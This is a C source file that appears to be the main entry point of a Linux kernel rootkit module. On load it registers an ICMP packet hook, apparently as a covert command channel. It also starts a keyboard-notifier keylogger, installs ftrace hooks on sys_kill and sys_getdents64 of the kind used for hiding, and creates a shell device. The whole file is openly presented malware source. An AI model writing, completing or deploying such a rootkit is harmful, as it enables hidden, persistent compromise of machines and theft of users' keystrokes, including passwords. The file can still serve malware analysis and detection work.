#include <linux/netfilter_ipv4.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/cdev.h>
#include <linux/sched.h>


#include "rootkit.h"
#include "debug.h"
#include "keylogger.h"
#include "hooks.h"
#include "drivers.h"


static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64)
    //HOOK("random_read", hook_random_read, &orig_random_read)
};

// hook for handling icmp packets
static struct nf_hook_ops nfho;

// notifier for keylogger
static struct notifier_block nb = {
	.notifier_call = keylogger_handler
};


static int __init startup(void)
{
    // configuring a hook which will handle icmp packets recieved
    nfho.hook = packet_reciever;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    if (nf_register_net_hook(&init_net, &nfho) != 0) {
        DEBUG_PUTS("rootkit: can't register a net hook\n")
        return -1;
    }

    init_keylogger_buffer();
    if (register_keyboard_notifier(&nb) != 0) {
        DEBUG_PUTS("rootkit: can't register a keyboard notifier\n")
        return -2;

    }

    if (fh_install_hooks(hooks, ARRAY_SIZE(hooks)) != 0) {
        DEBUG_PUTS("rootkit: can't register a hook\n")
        return -3;
    }

    if (!init_shell_device()) {
        return -4;
    }

    DEBUG_PUTS("rootkit: start\n")

    return 0;
}

static void __exit cleanup(void)
{
    // unregistering the hook after module was removed
    nf_unregister_net_hook(&init_net, &nfho);

    unregister_keyboard_notifier(&nb);

    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    exit_shell_device();

    DEBUG_PUTS("rootkit: finished\n")
}


MODULE_LICENSE("GPL");
module_init(startup);
module_exit(cleanup);


